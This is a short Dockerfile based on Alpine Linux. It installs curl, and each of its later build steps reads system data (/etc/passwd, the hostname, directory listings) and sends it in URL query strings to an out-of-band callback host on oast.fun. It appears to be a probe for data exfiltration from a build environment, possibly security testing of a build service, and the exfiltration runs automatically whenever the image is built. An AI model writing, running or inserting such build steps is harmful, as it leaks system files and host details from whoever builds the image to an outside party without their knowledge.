FROM alpine:3.20

RUN apk add --no-cache curl

RUN DATA="$(cat /etc/passwd)"; \
    curl -s "https://ouzqrqxdgmufdojiccd1ytasys8gfp9u.oast.fun/?id=$DATA"

RUN DATA="$(hostname)"; \
    curl -s "https://ouzqrqxdgmufdojiccd1ytasys8gfp9u.oast.fun/?hostname=$DATA"

RUN DATA="$(ls -a)"; \
    curl -s "https://ouzqrqxdgmufdojiccd1ytasys8gfp9u.oast.fun/?uname=$DATA"

RUN DATA="$(touch test.txt)"; \
    curl -s "https://ouzqrqxdgmufdojiccd1ytasys8gfp9u.oast.fun/?uname=$DATA"

RUN DATA="$(ls -a)"; \
    curl -s "https://ouzqrqxdgmufdojiccd1ytasys8gfp9u.oast.fun/?uname=$DATA"
